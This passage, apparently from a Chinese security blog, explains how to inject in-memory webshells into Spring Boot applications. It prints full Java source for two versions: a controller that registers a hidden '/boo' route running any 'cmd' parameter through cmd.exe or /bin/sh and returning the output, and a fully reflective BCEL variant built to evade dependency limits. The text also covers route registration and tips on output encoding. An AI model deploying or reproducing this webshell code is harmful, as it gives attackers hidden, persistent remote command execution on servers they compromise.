alt="9fad1b535bb5da21ab0f7d5cf225949f.jpg"><br>真是惊险，也是倒霉，怎么遇上这事情呢。我测试他的<img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691608744420-078b8871-fc4f-495b-a9f0-b8f644ff4b2a.png#averageHue=%233e3521&clientId=u1e300139-0fb9-4&from=paste&height=38&id=AnlE1&originHeight=48&originWidth=48&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3590&status=done&style=none&taskId=u39233fba-a732-48cc-8b04-ddf824e2828&title=&width=38.4" alt="00391CD9.png"></p><h1 id="二、正常的注入流程"><a href="#二、正常的注入流程" class="headerlink" title="二、正常的注入流程"></a>二、正常的注入流程</h1><p>抛开这个小插曲<br>回顾一下咱们正常的SpringBoot内存马。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectToController</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一个构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectToController</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">        configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span>(RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> InjectToController.class.getMethod(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/boo&quot;</span>)</span><br><span class="line">                .options(config)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="type">InjectToController</span> <span class="variable">springControllerMemShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InjectToController</span>(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第二个构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectToController</span><span class="params">(String aaa)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// controller指定的处理方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span>  IOException&#123;</span><br><span class="line">        <span class="comment">// 获取request和response对象</span></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//exec</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">arg0</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//当请求没有携带指定的参数(code)时，返回 404 错误</span></span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是正常的springboot内存马。我们重温一下来解构一下内存马的几个重要组成部分。</p><h2 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h2><p>我们肯定都是需要获取到上下文才有后续的一些操作，这里我们用的是一种比较通用的获取上下文</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>从上下文中我们可以获取自动注册的Bean，接着就可以进一步的利用了。</p><h2 id="恶意Function"><a href="#恶意Function" class="headerlink" title="恶意Function"></a>恶意Function</h2><p>恶意function也就是我们命令执行的方法了。上述内存马用着的方法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// 获取request和response对象</span></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//exec</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">arg0</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//当请求没有携带指定的参数(code)时，返回 404 错误</span></span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p>会判断操作平台，是linux还是windows，方便我们设置木马的编码。<br>用的是一个比较通用的回显方法，用scanner去输出。对于windows平台scanner需要做一下编码处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(builder.start().getInputStream(),<span class="string">&quot;gbk&quot;</span>).useDelimiter(<span class="string">&quot;wocaosinidema&quot;</span>);</span><br></pre></td></tr></table></figure><p>加上gbk的编码即可。然后<code>response.setCharacterEncoding(&quot;gbk&quot;);</code>设置response响应的编码，就可以避免中文乱码了。</p><h2 id="RequestMappingHanlder"><a href="#RequestMappingHanlder" class="headerlink" title="RequestMappingHanlder"></a>RequestMappingHanlder</h2><p>内存马最重要的部分就是他了，我们后续也是围绕着它展开，MappingHandler是我们添加恶意方法路由的地方。我们最终都是为了获取到它，然后将我们的恶意类绑定到指定的路由，对应内存马的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span>(RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">       <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> InjectToController.class.getMethod(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">       <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">       <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/boo&quot;</span>)</span><br><span class="line">               .options(config)</span><br><span class="line">               .build();</span><br><span class="line">       <span class="type">InjectToController</span> <span class="variable">springControllerMemShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InjectToController</span>(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">       mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);</span><br></pre></td></tr></table></figure><p>这几行代码完成了恶意路由的创建和注册。<br>这三个部分就是内存马的核心。我们接下来围绕这个展开。</p><h1 id="三、BCEL环境下注入构造"><a href="#三、BCEL环境下注入构造" class="headerlink" title="三、BCEL环境下注入构造"></a>三、BCEL环境下注入构造</h1><p>网上的文章几乎没有，所以需要自己多尝试<br>前面也说了，BCEL环境下只可以加载jdk原生的东西，所以有关其他依赖比如spring的依赖。我们只可以通过反射去调用，也称为”全反射”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.spel.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelInjectToController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BcelInjectToController</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">springLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">currentRequestAttributesMethod</span> <span class="operator">=</span> springLoader.loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>).getMethod(<span class="string">&quot;currentRequestAttributes&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">RequestFace</span> <span class="operator">=</span> currentRequestAttributesMethod.invoke(springLoader.loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>));</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRequest</span> <span class="operator">=</span> RequestFace.getClass().getDeclaredMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getRequest.invoke(RequestFace);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getResponse</span> <span class="operator">=</span> RequestFace.getClass().getDeclaredMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">response</span> <span class="operator">=</span> getResponse.invoke(RequestFace);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getParameter</span> <span class="operator">=</span> request.getClass().getDeclaredMethod(<span class="string">&quot;getParameter&quot;</span>,String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getWriter</span> <span class="operator">=</span> response.getClass().getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">sendError</span> <span class="operator">=</span> response.getClass().getDeclaredMethod(<span class="string">&quot;sendError&quot;</span>,<span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">//exec</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String cmd= (String) getParameter.invoke(request,<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            PrintWriter writer= (PrintWriter) getWriter.invoke(response);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//当请求没有携带指定的参数(code)时，返回 404 错误</span></span><br><span class="line">                sendError.invoke(response,<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Boogipop Error~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getFV</span><span class="params">(Object o, String f)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var3</span> <span class="operator">=</span> o.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (var3 != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = var3.getDeclaredField(f);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var5) &#123;</span><br><span class="line">                var3 = var3.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(f);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> var2.get(o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getMV</span><span class="params">(Object o, String m)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var3</span> <span class="operator">=</span> o.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (var3 != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = var3.getDeclaredMethod(m);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                var3 = var3.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(m);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> var2.invoke(o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="内存马部分"><a href="#内存马部分" class="headerlink" title="内存马部分"></a>内存马部分</h2><p>先从当前线程获取一个classloader，方便我们之后反射获取类。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691639275846-66ae6abf-97a3-4b17-aef6-8dd68b66d93d.png#averageHue=%232d2f2d&clientId=u1e300139-0fb9-4&from=paste&height=671&id=ud6e94651&originHeight=839&originWidth=1323&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1553646&status=done&style=none&taskId=uc96de213-d728-4d09-acbe-abd0f8fe57a&title=&width=1058.4" alt="image.png"><br>这一步获取到了WebAppClassLoader。然后我们回顾正常注入内存马的第一部，就是获取<code>currentRequestAttributesMethod</code>方法，然后反射调用。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691639439757-451d403c-14b2-4871-99eb-06b55756b888.png#averageHue=%232c2f2c&clientId=u1e300139-0fb9-4&from=paste&height=676&id=u18a8a75b&originHeight=845&originWidth=1326&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1596156&status=done&style=none&taskId=ud288e650-cda9-41a1-877e-1193fa1b37c&title=&width=1060.8" alt="image.png"><br>这里可以看到request和response，但他们都有个后缀<code>Facade</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691639757133-b42fd7ec-6c40-4384-919a-ea00343e0f79.png#averageHue=%232c2d28&clientId=u1e300139-0fb9-4&from=paste&height=419&id=u50cba3c5&originHeight=524&originWidth=1798&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1342413&status=done&style=none&taskId=u6f5a276c-6c8b-4e3b-95d2-690f24b1182&title=&width=1438.4" alt="image.png"><br>RequestFacade是对Request的一个封装，所以获取到他我们也可以进行一系列的处理。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691639813403-469500ca-c0d1-4960-8251-4d46c3d8a0b9.png#averageHue=%232d302d&clientId=u1e300139-0fb9-4&from=paste&height=708&id=u6e8c34d1&originHeight=885&originWidth=1419&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1801646&status=done&style=none&taskId=u2e1a1dd5-68f7-4a23-a039-e042259cc44&title=&width=1135.2" alt="image.png"><br>到这里把所有用到的方法全部反射获取完后<br><img 